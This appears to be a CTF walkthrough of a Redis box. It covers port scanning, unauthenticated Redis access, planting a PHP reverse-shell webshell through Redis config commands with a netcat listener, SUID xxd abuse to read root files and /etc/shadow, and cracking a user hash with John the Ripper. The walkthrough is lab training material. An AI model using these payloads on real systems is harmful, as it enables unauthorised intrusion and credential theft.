## 2 Background Information

### 2.1 Redis

According to its [official documentation](https://redis.io/docs/about/):

>*Redis is an open source, in-memory data structure store used as a database, cache, message broker, and streaming engine.*

## 3 CTF Process

### 3.1 Port-scanning

The first question asks us about the number of open ports, so let's start with an **nmap port-scan**.

![nmap-results_common_ports](nmap-scan_without_all_ports.png)

We can see an Apache web server listening to port 80, although, this does not seem like the right answer to the question.

The default command, that is without any port specification, scans the **most common 1,000 ports for each protocol** ([documentation](https://nmap.org/book/man-port-specification.html#:~:text=By%20default%2C%20Nmap%20scans%20the,1%2C000%20ports%20for%20each%20protocol.&text=This%20option%20specifies%20which%20ports,(e.g.%201%2D1023%20).)), so we can try scanning for all ports by adding the `-p` option:

![nmap-scan-all-ports](nmap-scan-all-ports.png)

Now, a **redis** server listening on port 6379 appears, and the information provided allows us to answer the next three questions ü•Ç!

### 3.2 Redis to RCE

[This](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) excellent **HackTricks** article provides info on how to connect to Redis. In addition, it let us know that **by default Redis can be accessed without credentials**! 

Futhermore, the article suggests to us trying the `info` command first. The ouput of this command will reveal if the database requires authentication or not. If it does, the following message will show up: `-NOAUTH Authentication required.` If not, it will return output with Redis info. 

So, let's try that:

![redis_login](redis_connection.jpg)

We are in without needing any credentials, and we also have a username at hand üéâ!

The same [article](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) lists two ways on how to get **Remote Code Execution (RCE)**:
1. Using the `redis-rogue-server` python script, but this only works for versions `<= 5.0.5`, thus, we can't use it as our target uses `6.0.7`.
2. Creating a **PHP Webshell**, with the prerequisite to know the *path of the Web site folder*. Based on our **nmap scan**, we know that we have an **Apache web server**, and by asking Google, we can find out its default directory:

![default_dir_apache](default_dir_apache.png)

 So let's trying to get our reverse shell:
 1. By following the article's steps, and using a PHP reverse shell from the [Highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell) blog (note that we need to **escape** the double quotes inside our command with `\`, otherwise it won't work!):
 ```shell
 # define the path of Apache's default directory
 config set dir /var/www/html/
 # create a "subdirectory" to host our reverse shell 
 config set dbfilename webshell.php
 # our reverse shell code
 set webshell.php "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<attacking-ip>/12345 0>&1'\"); ?>"
 # save our configuration
 save
 ```
 2. Open a listener to our machine:
 ```shell
 nc -lnvp 12345
 ```
 3. Visit the newly-created server's subdirectory: http://\<target-ip\>/webshell.php
  
 ![rce_setup](rce_setup.png)
 
Success üéä! With our initial foothold established, let's search for `user.txt`:

![flag1](flag1.jpg)

### 3.3 Privilege Escalation with SUID binaries 

The next question wants us to find the local user account's password. We already saw user `vianka` when first logged-in in Redis, but we saw it again while getting our first flag `/home/vianka/user.txt`. 

When trying to switch to this user, we get the message: `su: must be run from a terminal`. Thus, we need to upgrade our shell, and then find a way to discover `vianka`'s password!

![su_tty](su_tty.png)

It is always worth searching for files with [SUID](https://www.scaler.com/topics/special-permissions-in-linux/) permissions set, as it is often an easy way to do PrivEsc. 

![suid](suids.jpg)

We have done this a couple of times so far, and `usr/bin/xxd` does not seem like a binary that is usually on this list. As we always do when we want to check for SUID file's potential exploits, let's visit [GTFOBins](https://gtfobins.github.io/#xxd): 

![xxd_suid](xxd_suid.png)

Based on GTFOBins, we can use the `xxd` binary to read any file we want, since it will run as root. We can use this to answer the room's last two questions:
1. We can assume that the `root.txt` file is located under the `/root` directory. As a result, we can define the `LFILE` variable as `/root/root.txt` and snatch the root flag üö©.
2. We can do the same process for reading the `/etc/shadow` file in order to get `vianka`'s hash. Then, we can combine `vianka`'s info found on `/etc/passwd` file, and use both for unshadowing, and finally crack the hash with `john`.

Let's crack on üèÉ! We need to make sure to either be on `xxd`'s directory, `cd /usr/bin/`, or provide the full path, `/usr/bin/xxd`.

![flag2](flag2.jpg)

That was easy enough. Let go for some hash cracking now üîí!

### 3.4 Hash Cracking with John The Ripper

Let's start by reading the `shadow` file, copying `vianka`'s information, and pasting it into a file on our machine:

![xxd_shadow](xxd_shadow.png)

We need to also copy and paste `vianka`'s info from the `passwd` file into another file on our local machine:

![passwd](passwd.png)

Now, all we have to do is to unshadow the files and let `john` do the work for us:

![john](john_vianka.jpg)

And that's us done üçª!
